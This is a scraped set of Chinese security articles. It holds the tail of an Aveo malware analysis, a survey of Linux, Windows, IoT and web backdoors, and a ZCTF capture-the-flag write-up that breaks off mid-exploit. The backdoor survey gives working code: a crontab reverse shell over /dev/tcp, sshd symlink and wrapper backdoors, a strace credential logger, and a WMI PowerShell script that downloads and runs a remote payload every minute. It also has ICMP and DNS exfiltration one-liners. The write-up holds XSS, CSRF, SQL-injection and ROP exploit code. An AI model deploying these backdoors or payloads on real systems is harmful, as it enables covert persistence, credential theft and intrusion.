Truncated][Decrypted]1 ipconfigWindows IP ConfigurationEthernet adapter Bluetooth Network Connection:   Media State . . . . . . . . . . . : Media disconnected   Connection-specific DNS Suffix  . : [Truncated]结论Aveo 与 FormerFirstRAT 在多个特征上都是一致的，包括加密模块、代码重用和 C&amp;C 功能。正如前面讨论的 FormerFirstRAT 样本，这个恶意软件家族看起来也是针对日语用户。使用自解压文件的 WinRAR 释放诱饵文档和 Aveo 的恶意软件副本以及清理脚本。Palo Alto Networks 的客户已经免受以下威胁：1.AutoFocus 已经对这种威胁创建了跟踪和监控2.WildFire 归类 Aveo 到恶意程序3.C&amp;C 域名列入 Threat Prevention 拦截黑名单IOCSHA256 哈希9dccfdd2a503ef8614189225bbbac11ee6027590c577afcaada7e042e18625e28101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4dC&amp;C 域名snoozetime[.]info注册表键值HKCU\software\microsoft\windows\currentversion\run\msnetbridge文件路径%APPDATA%\MMC\MMC.exe%TEMP%\MMC\MMC.exe","2016-12-04 19:46:20","系统安全","Aveo恶意软件分析","http://nsoad.com/Article/system/20161204/877.html"
"5ccbf9d54f2f0a0a7a69bfcd","没有最好的后门，只有最合适的后门。","kong","前言没有最好的后门，只有最合适的后门。时光荏苒，岁月如梭，在这篇文章里，我将对后门的各种形式进行解读和总结，这不仅仅是能帮你找到回忆，更希望的是能给予大家帮助、启发思考。后门种类繁多，林林总总，根据不同的需求出现了很多奇怪好玩的后门。它可以是一行简单的代码，也可以是复杂的远控木马，它可以是暴力的，也可以是很优雅的。在整体架构上，一个优秀的后门应该充分考虑其功能、触发方式和通信方式等方面。针对不同的方面，杀软也会根据其特征进行处理。为了进一步的持续性控制以及后渗透，后门越显复杂化。从后门的发展史中可看出，这是一场攻与防的持续性较量。从终端平台的角度看，后门可分为Linux型、Windows型和IOT型；对于Linux而言，从后门的形式上看，可分为配置型、logger型和rookit型；对于windows而言，从后门触发方式的角度看，可分为Registry型、Schtasks型和WMI型；从通信方式的角度看，后门可分为http/https型、irc型、dns型、icmp型等等；从网站应用的角度看，后门可分为模块扩展型、后端语言型和配置文件型。......终端类一. Linux后门1. 配置型这里的配置型是指借助Linux系统本身的一些特性来完成后门布置功能。1.1 crontab后门运维经常会用到该命令，这相当于windows的计划任务，规定时间来执行指定命令。这通常与反弹shell一起运用。(crontab -l;printf ""*/5 * * * * exec9&lt;&gt; /dev/tcp/localhost/8080&amp;&amp;exec0&lt;&amp;9&amp;&amp;exec1&gt;&amp;92&gt;&amp;1&amp;&amp;/bin/bash --noprofile –I;\rno crontab for `whoami`%100c\n"")|crontab -1.2 ssh公钥免密将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。客户端：$ ssh-keygen -t rsa$ lsid_rsa  id_rsa.pub把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。服务端：$ chmod 600 ~/.ssh/authorized_keys$ chmod 700 ~/.ssh这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现。1.3 软连接后门ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;经典后门。直接对sshd建立软连接，之后用任意密码登录即可。ssh root@x.x.x.x -p 5555但这隐蔽性很弱，一般的rookit hunter这类的防护脚本可扫描到。1.4 SSH Server wrapper# cd /usr/sbin/# mv sshd ../bin# vim sshd#!/usr/bin/perlexec""/bin/sh""if(getpeername(STDIN)=~/^..LF/);exec{""/usr/bin/sshd""}""/usr/sbin/sshd"",@ARGV;赋予权限chmod 755 sshd，最后正向连接：socat STDIO TCP4:target_ip:22,sourceport=19526其中，\x00\x00LF是19526的大端形式，便于传输和处理。原理是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。隐蔽性比刚刚介绍的软连接后门要好。2. logger型2.1 alias后门这种通过替换命令来使得evil效果最大化的用法，一般是通过追踪ssh的系统调用比如read、write等来记录下ssh的操作。在当前用户的.bashrc下添加如下代码：alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh'当然，这只是alias后门的一种用法，可根据具体情况举一反三。2.2 pam后门pam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。搭建方式见下连接。2.3 openssh后门同理，也是下载对应的恶意补丁包，来记录管理员的帐号密码。但该后门与pam后门存在很大的问题是编译环境，有时在实战中会出现各种各样的问题。搭建方式见下连接。http://www.tuicool.com/articles/eIv22az3. rookit型3.1 应用级rootkit应用级rookit的主要特点是通过批量替换系统命令来实现隐藏，如替换ls、ps和netstat等命令来隐藏文件、进程和网络连接等，有时会有守护进程来保证后门的稳定性。推荐两款常用的木马：mafix和brookit。如果想要学习linux类木马，推荐阅读orange的tsh源码，基本上涵盖了常规木马应具有的特点。3.2 内核级rookit隐藏性通常要借助对linux系统调用的截获来达到目的，并且难以查杀，难以清除，危害巨大。由于未找到相应例子，遂不做具体分析。希望有同学能补充。二. windows后门windows后门博大精深，实在不好分类，因为后门常需持久化潜在运行，受到powersploit中persistence脚本的启发，因此采取使用后门的触发方式进行分类，分为registry型、schtasks型和WMI型。1. registry型在一般用户权限下，通常是将要执行的后门程序或脚本路径填写到如下注册表的键值中HKCU:Software\Microsoft\Windows\CurrentVersion\Run，键名任意。普通权限即可运行。不过这老生长谈的后门早已被用烂，360杀软会弹框提示。2. schtasks型该类型后门可分为管理员权限和普通用户权限，管理员权限可以设置更多的计划任务，比如重启后运行等。举例：每小时执行指定命令：schtasks /Create /SC HOURLY /TN Updater /TR $CommandLine这里比较大的限制是策略问题，只能按照规定的时间来执行相关程序或命令。通常来讲，持久性的APT对于这点要求较高。3. WMI型Defcon23的演讲后，WMI型后门的热度在国外迅速蔓延。（强烈推荐使用该类型后门）它是只能由管理员权限运行的后门，一般是用powershell编写。目前以这一触发方式运行的后门是不会引起杀软任何反映的。具体原理可到drops去了解。该类型后门主要用到了WMI展现出来的两个特征：无文件和无进程。将core code加密存储于WMI类的property中，而该位置在复杂的CIM 数据库中，这达到了所谓的无文件；将filter和consumer异步绑定在一起，当规定的filter满足条件时，比如间隔1min，那么系统会自动启动一进程（名称为powershell）去执行consumer（后门程序）中的内容，当执行完成后，进程会消失，持续的时间根据后门运行情况而定，一般是几秒，这达到了所谓的无进程。上述三类的详情代码请参考powersploit现阶段无论再复杂的WMI后门都是围绕上面两点而展开的，最核心的是后者。下面是比较典型的代码，功能为每分钟执行‘下载并执行’：$Name = 'test'# build the filter$TimeExecTime = 60$Query = ""SELECT * FROM __InstanceModificationEvent WITHIN                         $TimeExecTime WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""$NS = ""root\subscription""$FilterArgs = @{    Name=$Name    EventNameSpace=""root\cimv2""    QueryLanguage=""WQL""    Query=$Query}$Filter = Set-WmiInstance -Namespace $NS -Class ""__EventFilter"" -Arguments $FilterArgs# build the consumer$ConsumerName = $Name$command = ""`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy = [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.DownloadString('$URL'))""#$encCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))$commandLine = ""C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -NoP -NonI -w hidden -Command $command""  $ConsumerArgs = @{    Name=$ConsumerName    CommandLineTemplate=$commandLine}$consumer = Set-WmiInstance -Class ""CommandLineEventConsumer"" -Namespace $NS -Arguments $ConsumerArgs#Bind filter and consumer$Args = @{   Filter = $Filter   Consumer = $consumer}Set-WmiInstance -Class ""__FilterToConsumerBinding"" -Namespace ""root\subscription"" -Arguments $Args也出现过一些流氓软件比如xxx使用这种方式来达到“删不掉”的效果。三. IOT后门物联网的脆弱性因Mirai恶意软件的肆用而不断凸显，特别是弱口令的泛滥、致使了大批物联网设备沦陷。其中造成的危害不言而喻，不但可以耗用其资源，更可怕的是可能利用设备本身的功能造成意料不到的伤害。如果单单从技术的角度上讲，Mirai确实是一款非常优秀的恶意软件。在这里，我们只讨论它们的后门特性：1.进程对于运行时进程的处理，Mirai采用的是进程名随机，也算是为了不被特征提取所采取的一个措施。2.防重启因为IOT设备的特殊性，无法将程序写进设备中，只能驻留在内存里，所以需不能使设备重启。在固件里，有一进程会不断向watchdog进程发送一字节数据，如果没有该操作，设备则会重启。Mirai采取的是关闭watchdog的功能。3.通信协议该过程可以分为上线过程：bot发送\x00\x00\x00\x01，得到回应后再发送\x00；心跳过程：bot间隔60s发送\x00\x00cnc，cnc回应\x00\x00；解析执行：cnc对bot发出的指令里采取了一定的格式。[target_num] 02 [IP] 08 08 08 08 [MASK] 20 [IP] 07 07 07 07 [MASK] 20.....IOT设备后门的重点往往是在其功能的实现上，而不是在后门的persistence上，因为IOT设备一旦被突破，几乎入无人之境，恶意软件会合理地最大化利用其中的资源。通信方式类后门的网络通信行为同样是防火墙的侦查重点，在复杂的实际环境下，怎么把被控端的数据回传成为了一个难点。对于不同的防火墙，其使用的策略也有些不同。下面以后门通信方式分类来为大家讲解：1. http/https型目前可以说这是最流行的通信方式，可借用第三方的api来实现回连功能，从很大程度上讲解决了很多困难。像在github star比较高的，如twittor、gcat等，从代码上看不会有太大问题，主要是完成了对相应第三方应用的api调用以及功能的实现，但是这种第三方选取并不合理，它会造成溯源十分容易。先不论gmail的实名制，问题的关键在于被控端只能共享一个或几个gmail帐号，当其中一个被控端被追查后，其它的被控端很可能就处于危险状态。根据经验来看，如果真要借助第三方的网站来完成通信，比较常用的是论坛、网盘等，可以将被控端各自的权限分离开来。在很多APT报告中，我们可看到dropbox及reddit快成为远控木马的重灾区，官方当然也出台了一些措施来制止这种行为。这部分木马可参考nishang框架中的HTTP-Backdoor脚本。总的来讲，这种适合于比较小型的，不适合于大型僵尸网络。在国内这种类型的网站基本需要实名制，以官方的力量来追踪是十分容易的。危害小则被封号，大则查水表。目前对于追踪的问题主流采取的是DGA(Domain Generation Algorithm)，自建服务器。攻击者和被控段以同样的算法和种子算出一系列域名，种子的约定可以是日期，可以是天气等。攻击者注册其中的一个或多个域名。这样的好处是反汇编难度大，算法不易被破解。即使被破解了，安全人员还需抢在攻击者之前及时注册生成的大量域名，费时费钱费力。更多详细的可参考《C&amp;C控制服务的设计和侦测方法综述》2. irc型irc的木马优点很多，比如管理方便，便于远控协调分工，channel隐藏，追溯难。缺点很明显，国内只有较少的用户使用irc，用户防火墙可能会拦截该流量，具体情况根据地区而定。关于这部分irc木马的中文实例资料可参考：http://www.freebuf.com/articles/web/110859.html3. icmp型ICMP通信协议中可看到在最后空余了很大的data段，名为数据缓冲区，可填充60000多字节。因此，可将被控端得到的数据放入其中：$cmd = ls;$timeout = 1000;$server_ip = 'xxxx';(New-Object System.Net.NetworkInformation.Ping).Send($server_ip, $timeout, $cmd)在server_ip上抓包可看到返回结果。4. dns型DNS原理在这不过多展开，这种类型的逃逸方法一般是用自己申请的域名，将NS记录指向搭建的NS服务器上，使用DNS泛解析，把用户所查询关于该域名的信息记录下来。ping -c 2 `whoami`.xxxx.ceye.io或者nslookup -querytype=txt $data.ns.lynahex.com 8.8.8.8不过使用如上的常规方法，似乎会对data长度有限制。自建NS服务器的源码可看NoEye（题外话：有的厂商从数据库中查询指定域名的txt记录时并未过滤，可能会有sql注入。:-D。）该类流行的木马可参考dnscat2,它涉及了更底层的包构造，即使没有域名，也可使用该协议进行通信。具体用法如下：http://bl4ck.in/index.php/penetration/use-dns-to-bypass-firewall.html......总的来说，这类后门依赖于上层协议，符合人们常用协议的范围，同时，攻击者也在探寻新兴的协议来exfiltrate。网站类传统的后门中自然少不了该类型，从用户发出数据请求开始到最终落入网站的数据库中，经过服务端的每一环节都有可能成为攻击者利用的地方。1. 模块扩展型中间件之所以能被利用，是因为它们的可扩展性，当布置完模块或插件时，中间件无法判断开发者的行为是否为恶意。1.1 apache将后门增加到apache模块目录中，攻击者只需要简单地发起一个请求就可拿到root权限的shell，并且没有任何日志记录。最出名的莫过于mod_rootme具体操作可参考：http://bl4ck.in/index.php/penetration/apache-port-reuse-backdoor.html1.2 nginxnginx占有内存少，并发能力强，受到很多用户的喜爱。它可很方便地添加和升级模块，同理，pwnginx作为经典的后门也是应用了该原理，程序员只需将正常的功能稍微改动，就能达到另一面的效果。具体操作可参考：http://www.hackdig.com/?07/hack-4762.htm1.3 iisiis后门是用了iis本身的机制，当在http头里增加一字段即可触发后门，并执行发过来的命令。具体原理和操作可参考：http://esec-lab.sogeti.com/posts/2011/02/02/iis-backdoor.html中间件的后门大多是以类似上述原理为基础的。1.4 PHP扩展库同理，将编译好的so文件添加到php.ini的extension中。当模块被初始化时，会去加载执行我们的代码。当发送特定参数的字符串过去时，即可触发后门。具体操作可参考：http://cb.drops.wiki/wooyun/drops/tips-3003.html......2. 后端语言型这类后门在新型框架和语言的兴起下，影响力有些稍稍减弱。主要原因是现主流框架都采取路由的方式来映射url，有时攻击者即使上传完后门，也有可能无法找到对应的路由映射方式。站在不同人群的角度来看后门也别有一番风情。下面分为开发者后门和攻击者使用的后门，其中针对攻击者的后门是以PHP为例。2.1 开发者后门有时开发者也会在代码中留下后门，比如x博CMS。它通常是一些奇怪的代码，稍微动态调试下可分析出后门，这是属于比较低级的，更高级的的后门是逻辑和理论相关的漏洞，在defcon23上进行的“卑鄙密码竞赛”，曾经wooyun有介绍，有的参赛者将密码学的知识和PHP特性相结合，并以一定的逻辑性代码迷惑大多数人。虽然不难，但能想出这点子实在难能可贵。更为有趣的是，即使被发现了也可当作是个漏洞处理，舆论不会偏向于说这是开发者留下的后门。另外一方面，后门不一定直接出现在产品中，可能也会存在库中或编译好的文件里，比如nodesjs仓库或pyc后门。2.2 PHP后门随着时代的变迁，木马的重心也随着转移。前10年里，PHP马看重的是功能，而如今则是免杀以及绕waf的能力，具体来说，指的是木马静态文件的免杀和通信流量的无特征。在实战中，主要采取的方法为混淆编码、字符替换等，还可利用解释性语言的特性以及其回调机制。对于通信流量方面，一般采取对称加密，如DES，而不是编码等。比较成熟的后门是weevely，也可根据需求将菜刀完善，把流量加密。3. 配置文件型该类型后门主要是通过阅读相关官方文档来挖掘发现，主要应用场景是bypass上传文件的黑名单。以PHP语言为例：3.1 .htaccess后门在.htaccess中添加php解析的新后缀并上传，之后上传该后缀的木马即可。AddType application/x-httpd-php .abc3.2 .user.ini后门.user.ini相当于用户自定义的php.ini。上传.user.ini，其中的内容为：auto_prepend_file=xx.gif可以让该目录下的所有php文件自动包含xx.gif，我们直接上传xx.gif作为木马。不过较大的限制是该目录下必须要有正常的php文件才能使得xx.gif中的代码执行。......总结本文从多个纬度讲述了五花八门的后门，需求有多大，后门就会有多少。后门并不神奇，它无处不在，可能隐匿于正常功能中，隐匿于我们的身边。就如余弦说的那样，“以邪气的眼光看世界”，“每一名程序员都可以成为黑客”。后门也只是一段代码，只不过有时会充满无尽的想象力，这也是无穷的魅力所在。参考资料wooyun-dropshttp://www.joychou.org/index.php/web/ssh-backdoor.htmlhttp://www.freebuf.com/articles/terminal/117927.htmlhttps://www.cdxy.me/?p=749https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html","2016-11-26 20:45:26","网络安全","那些年，我们一起玩过的后门","http://nsoad.com/Article/Network-security/20161126/851.html"
"5ccbf9d54f2f0a0a7a69bfce","第三届XCTF——郑州站ZCTF第一名战队Writeup","FlappyPig","Misc-Sign in据说有12s麒麟臂。Web-web100网页设计得很简单，首页只返回了ha? 没有其他链接，猜到可能会有源码。尝试过后在.index.php.swp文件中得到php源码限制flag参数的md5必须为一个固定的0e开头的md5，并在同时在字符串中包含zctf，然后会输出flag。写好代码爆破一番得到zctf00=a8。得到flagWeb-Find my eyes一开始会觉得是一个博客站，逻辑比较复杂，后来发现其实只有contact.php 文件中有一个留言功能，结合网站部署有csp。猜测是xss漏洞。然后测试4个参数。只有textarea有过滤，其他地方感觉不能正常写入html。然后textarea的过滤相当严格。找了很多用来加载外部资源的html关键字都被过滤。然后大师傅发现是高版本的jquery库，可以利用sourceMappingURL加载外部资源。最后成功的payload是&lt;/textarea&gt;&lt;script&gt;var a=1//@ sourceMappingURL=//xss.site&lt;/script&gt;在服务器的http request里面user-agent中发现flagWeb-easy apk打开APK后发现有两个窗口，一个用于验证用户名密码，一个用于提交邮件，APK会将用户名密码等信息提交到远程服务器做验证，提交前会对用户的输入做一次简单的加密。加密函数位于libnative-lib.so中的Change函数中，如下，主要是使用密钥对数据进行循环的异或加密。在加密前会将输入字符串逆序。加密后转化为十六进制。在加密前，changekey函数会对密钥做简单的修改，大概的逻辑是对原字符串每隔2个取一个字符。因此，在java层传入的密钥“1234567890”经过变换后成为“1470”。因此根据上面的分析，可以写出与原APK逻辑一致的Python脚本import requestsdef enc(data):    key = '1470' * 30    data = data[::-1]    result = []    for i in range(len(data)):        tmp = ord(key[i]) ^ ord(data[i])        result.append(tmp)    return ''.join(['%.2x' % i for i in result])def step1(username, password):    reply = requests.post('http://58.213.63.30:10005/', data={'username': enc(username), 'password': enc(password)})    print reply.text    return reply.json()def step2(username, password, mail, title, body):    # body=40454641&amp;password=0305&amp;title=404546&amp;username=&amp;mail=4645    reply = requests.post('http://58.213.63.30:10005/mail.php',                          data={'username': enc(username),                                'password': enc(password),                                'mail': enc(mail),                                'title': enc(title),                                'body': enc(body)})    print reply.text    return reply.json()if __name__ == '__main__':    username = '1'    password = '2'    mail = '3'    title = '4'    body = '5'    if step1(username, password)['result'] == 'OK':        step2(username, password, mail, title, body)队里的师傅反编译apk后查看逻辑，发现就是将数据内容与密钥1470循环亦或后正常的post提交。有两个页面，index.php用来登录 mail.php用来发邮件。首先发现参数有sql关键字的过滤，然后参数内容用‘or 1=1# 发现user返回了admin，但是result还是false，不能进行下一步发邮件的操作。然后思考能不能用union或者盲注把admin用户的password跑出来。但是（）被过滤，不能使用函数，时间盲注不了，然后password字段被过滤，布尔值注入也不能成功。然后发现用union%0aselect能成功绕过过滤，into被过滤，也不能成功写文件。然后可用的关键字还有order by。两者结合发现自己union注入出来的列和原本的admin列同时存在的时候order by 3。然后回显中出现了username的那一列相对字典序要小一点。和盲注差不多就能跑出来了。认证过程放入step1函数，注入代码如下  for i in string.printable:        username = ""'or 1=1 union\xa0select 2,'233','%s' order by 3    #""%i        print username        if step1(username, password)['username'] == 'admin':            print last            break        last=i注入出来后md5解密。第二个接口是phpmailer漏洞，结合hint根目录不可写，在upload目录下写入php，得到flagWeb-onlymyself大概浏览网站，有注册，登陆，修改个人资料，记录note，搜索note，提交bug这几个功能。然后挨着测试是否有功能缺陷。admin是系统自带的，所以猜测flag在admin用户哪里。可以利用xss进入管理员账号。然后发现有交互的功能只存在于提交bug那里。然后发现漏洞链接那里存在xss漏洞。而且xss漏洞进去那个页面存在注入。后来才知道是设计不完善，于是重新思考，猜测会模拟管理员去点击提交的那一个链接，可以利用javascript伪协议或者csrf漏洞+selfxss。选择的后者，在更改个人资料的时候发现并没有验证csrftoken,所以写了一个利用csrf的html网页&lt;form id=""ffrom"" action=""http://58.213.63.30:10003/checkProfile.php"" method=""POST"" id=""profile"" enctype=""multipart/form-data""&gt;&lt;input type=""file"" id=""image"" name=""image"" data-filename-placement=""inside"" style=""left: -179.99px; top: 19.3333px;""&gt;&lt;/a&gt;&lt;input name=""nick"" id=""nick"" value=""&lt;scriimgpt src=//xss.site/1.js&gt;/*""&gt;&lt;input name=""age"" id=""age"" value =""2""&gt;&lt;input name=""address"" id=""address"" value=""&lt;/scripimgt&gt;""&gt;&lt;input class=""btn btn-primary"" id=""submit"" name=""submit"" type=""submit"" value=""Submit""&gt;&lt;/div&gt;        &lt;/form&gt;&lt;script&gt;submit.click()&lt;/script&gt;只要让服务器的bot先访问csrf网页，在访问首页就可以了。这样能成功xss到管理员。但是cookie有httponly标记，所以不能直接用管理员账号登录。读取了note.php网页后发现里面并没有flag。然后就思考会不会是利用search.php枚举flag。然后写出js代码。tab=""_0123456789abcdefghijklmnopqrstuvwxyz}""str=''$.ajaxSettings.async=falsewhile(true){  for(i=0;i&lt;tab.length;i++){    //console.log(tab[i]);    flag=false    x=$.get('http://58.213.63.30:10003/search.php?keywords=zctf{'+str+'\'+tab[i]);    if(x.status==404) flag=true;    if(!flag) break;  }  str+=tab[i];  console.log(str);  if(tab[i]=='}') break;}location.href=’//xss.site’+str其中有一个小坑，flag中包含_，而search.php代码里sql查询用的like来判断,直接输入_会被理解为匹配任意单个字符。需要用\转义。$.get默认是异步提交，用$.ajaxSettings.async=false设置成同步提交，服务器正常执行完成后能够得到flagMisc-Russian Zip伪加密，我们可以利用010 Editor编辑器的模板功能，能更好的修改加密位。deFlags 都修改为0修改保存后，就能成功解压了。 后面队友发现，这是minecraft，游戏文件，打开后，FLAG在游戏地图中。Misc-whisperPNG用stegsolve打开看到某通道里有三个人名，rsa的作者，此为hint1。打开starhere.exe，看到如下：44个字节，每个字节逐位判断，这里有两个方法，第一个方法比较暴力，直接爆破字节看进correct的次数，用angr什么的都可以。第二个就是自己分析了。主要是sub_401000函数。进去后发现：一个rsa，和hint1的提示相符，e是65537，n是那串，随便就能分解，太小了，然后解4010b0里面的那44个数即可：n=2344088051  p=46099  q=50849     e=65537     import primefac  d=primefac.modinv(e,(p-1)*(q-1))%((p-1)*(q-1))     v=[1]*100  v[15] = 622838535  v[16] = 0x1E53E463  v[17] = 0x217153B7  v[18] = 0xED044EB  v[19] = 0x26EC91AF  v[20] = 0x4F8C7090  v[21] = 0x45E4F9BB  v[22] = 0x26EC91AF  v[23] = 0x6D04B642  v[24] = 0x26EC91AF  v[25] = 0xFF559EE  v[26] = 0x1E53E463  v[27] = 0x55C81190  v[28] = 0x55C81190  v[29] = 0x58006440  v[30] = 0x217153B7  v[31] = 0x26EC91AF  v[32] = 0x35F1D9B2  v[33] = 0x4D3D8957  v[34] = 0x35F1D9B2  v[35] = 0x26EC91AF  v[36] = 0x7172720E  v[37] = 0x1E53E463  v[38] = 0x6AC5D9F7  v[39] = 0x58006440  v[40] = 0x4710F19D  v[41] = 653037999  v[42] = 1476420672  v[43] = 561075127  v[44] = 2095854527  v[45] =   -2030465449  v[46] = 1439175056  v[47] = 1476420672  v[48] = 1439175056  v[49] = 653037999  v[50] = 508814435  v[51] = 561075127  v[52] = 653037999  v[53] = 839707766  v[54] = 1829025346  v[55] = 1751579215  v[56] = 1476420672  v[57] = 695921644  v[58] = 872207435  for i in range(15,59):          print chr(pow(v[i],d,n)% 256) ,此为hint2。Hint1.png用winhex打开，后面一很大一串字符串将数据拷贝出来，base64解密，将解密后的文件binwalk分离可以直接从文件中找到rar的密码，解密得flagReverse-QExtend这个程序有少量混淆，第一个是用call+pop指令使得ida没法正常反编译，第二个是修改了函数的返回地址。在ida中进行修复到能正常f5.分析功能，发现是个汉诺塔游戏。初始状态:需要达到的状态:各操作码对应的操作：手工完了下汉诺塔，得到的最短路径为053254104123104524104操作码为input[i]%16-1，所以爆破了一下input，最终得到的flag为:ZCTF{A&amp;$#&amp;5rA5r#$rA5&amp;#5rA5}Reverse-EasyReverse符号没去掉，encrypt_str函数，逆向完后发现是xtea算法，秘钥为：print (chr(222)+chr(173)+chr(190)+chr(239)).encode(""hex"")deadbeef处理一下xtea解密即可得到flag，16字节有些许问题，补齐，然后利用python的xtea解密即可：from xtea import * x = new(k, mode=MODE_ECB)   print x.decrypt(v5)Reverse-CryptTab1. 首先是一个压缩包，有密码，不过在文件的末尾得到了压缩密码，解压得到一个data文件。2. 看起来像shellcode，就用ida打开分析。发现对0x17开始的0x2200字节进行了0xcc异或操作。异或之后分析发现后面有一个dll，将其提取出来，用ida打开，可以发现导出了一个Encrypt函数。3. 从程序上看代码异或解密完之后直接跳转到sub_17函数。分析sub_17函数，发现是一个获取kernel32.dll的地址，然后就执行不下去了，坑。从ida的调用图上猜这儿应该跳转到sub_131。4.    分析sub_131，有发现需要参数ebx，但是ebx赋什么并不知道，坑。后来分析到sub_44，该函数为获取库函数的地址，第一个参数为dll的地址，第二个参数为函数的hash值，第二个参数从[ebx+1]处取得。因为shellcode一般需要获取LoadLibraryA函数地址，算了一下LoadLibraryA的hash值为0xec0e4e8e，然后在shellcode中搜索这个值，还真找到了。string = 'LoadLibraryA'  def rol(a):    return ((a&lt;&lt;0x13) | (a&gt;&gt;(32-0x13)))&amp;0xffffffffc = 0for i in range(len(string)):    c = rol(c) + ord(string[i])  print hex(c)所以ebx的值应该为0x310。向下分析，可以看到程序得到了LoadLibrayA、VirtualAlloc和VirtualFree3个函数的地址，然后又执行不下去了，坑。5.    然后就对着函数猜了。应该就是对0x156处的0x10个字节和0x166处的0x30字节作为输入，加密得到的值与0x19a处的0x30字节进行比较。6.    后面就是分析Encrypt函数，各种交换移位，我这种算法渣只能想到爆破了。注：以下代码格式有修改，请读者自行调整。int main(){       unsigned char str[0x100] = ""\xF3\x23\xB5\xA6\xF5\x6A\xCB\x88\xD2\xC6\xD2\x2F\x32\xB9\xC3\xAA\x32\x9E\xAD\xEE\x8C\x22\x2D\x45\x62\x67\xFB\xD9\x64\x46\xF8\xE7\xC8\x20\x35\x86\xE9\x98\xBF\xD5\x55\xCA\x8B\x85\x67\x76\x19\x9A"";          printf(""len=%d\n"", strlen((char*)str));       HMODULE handle = LoadLibraryA(""DLL_Export.dll"");       ENCRYPT ProcAddr;       ProcAddr = (ENCRYPT)GetProcAddress(handle, ""Encrypt"");       printf(""%x\n"", ProcAddr);          unsigned char c1[]= ""\x21\x23\x25\x26\x2a"";       unsigned char c3[]=""\x43\x45\x47\x49\x4b"";       unsigned char c2[]=""\x35\x36\x37\x38\x39"";          unsigned char input[17];       //for(int i0=0;i0&lt;5;i0++)        int i0 =4;        printf(""i0=%d\n"", i0);        {        for(int i1=0;i1&lt;5;i1++)        {        printf(""i1=%d\n"", i1);        for(int i2=0;i2&lt;5;i2++)        {        for(int i3=0;i3&lt;5;i3++)        {        printf(""i3=%d\n"", i3);        for(int i4=0;i4&lt;5;i4++)        {        for(int i5=0;i5&lt;5;i5++)        {        for(int i6=0;i6&lt;5;i6++)        {        for(int i7=0;i7&lt;5;i7++)        {        for(int i8=0;i8&lt;5;i8++)        {        for(int i9=0;i9&lt;5;i9++)        {        for(int i10=0;i10&lt;5;i10++)        {        for(int i11=0;i11&lt;5;i11++)        {        for(int i12=0;i12&lt;5;i12++)        {        for(int i13=0;i13&lt;5;i13++)        {        for(int i14=0;i14&lt;5;i14++)        {            input[0] = c1[i0];            input[1] = c2[i1];            input[2] = c3[i2];            input[3] = c1[i3];            input[4] = c2[i4];            input[5] = c3[i5];            input[6] = c1[i6];            input[7] = c2[i7];            input[8] = c3[i8];            input[9] = c1[i9];            input[10] = c2[i10];            input[11] = c3[i11];            input[12] = c1[i12];            input[13] = c2[i13];            input[14] = c3[i14];            input[15] ='\x24';            input[16]='\x00';            unsigned char data[0x100] = ""\x38\x9B\x50\xCE\x86\xDD\xF0\x1D\x0D\xC3\xD6\xE2\xF2\x29\xD3\x83\x6C\xE8\x86\x5F\x95\xE6\x4F\x63\x5F\x3B\x9B\x5F\x53\xBC\x41\x2A\x49\x08\x02\xAA\x10\xEC\x2C\x58\xD5\x27\xCD\x93\x38\x10\xE4\xDC"";            unsigned char * output;            __asm                      {                   push esi                   lea esi, input                   push esi                   lea esi, data;                   call ProcAddr                   mov output, eax                   pop eax                   pop esi            }            if(!memcmp(output, str, 0x30))            {                   printf(""%s\n"", input);            }            }            }            }            }            }            }            }            }            }            }            }            }            }            }            }}等到爆出来的时候，比赛已经结束了。爆出来为:%6K#7E&amp;5C*9G!8I$当然这还不是最终结果，还要用这个作为密钥，去AES解密加密表，才能得到flag。。。Pwn-loginsprintf里面的格式化字符串的内容可以被自身的格式化给覆盖掉，把%s:%s覆盖掉，覆盖成%hhn，然后格式化来改写check_stack_fail的最后一字节，拿shell的时候 ，不能用system拿，不能用system拿，环境变量被栈覆盖掉了：from zio import *     target = (""58.213.63.30"",4002)       def get_io(target):    r_m = COLORED(RAW, ""green"")    w_m = COLORED(RAW, ""blue"")    io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)    return io       def gen_rop_data(func_addr, args, pie_text_base = 0):     p_ret = [0x0804844e, 0x08048465, 0x0804891a, 0x08048919, 0x08048918]     rop_data  = ''     rop_data += l32(func_addr)     if len(args) &gt; 0:         rop_data += l32(p_ret[len(args)] + pie_text_base)     for arg in args:         rop_data += l32(arg)     return rop_data       def pwn(io):        puts_got                   = 0x0804a01c              offset_puts                = 0x656a0                 puts_plt                   = 0x080484c0        read_plt                   = 0x08048480        read_buff_addr = 0x0804862B        check_stack_fail_got = 0x804A014        bss_addr = 0x0804a000 + 0xe20    leave_ret = 0x08048715    pop_ebp_ret = 0x0804871f #: pop ebp ; ret        username = """"    #username += 'bbbb'    username += l32(check_stack_fail_got)    username += ""a""*0x4C    #username += ""bbbb""    username += gen_rop_data(puts_plt, [puts_got])    username += gen_rop_data(read_buff_addr, [bss_addr, 0x01010101])    username += l32(pop_ebp_ret) + l32(bss_addr)    username += l32(leave_ret)    #username += gen_rop_data(puts_plt, [puts_got+4])            print hex(len(username)), hex(0xd6 - 0x5c - 4)    #username = username.ljust(0xd6 - 0x5c - 4, 'a')        #username += ""%s:%s.%p.%p.%p.%p.%p""# + ""%p.""*4    #username += ""%x."".ljust(8, '-')*10    #username += ""aa:""    username = username.ljust(0xc0, 'a')    username += 'a'*(0x66-0x43)    username += ""%9$hhn."".ljust(10, '-')    #username += 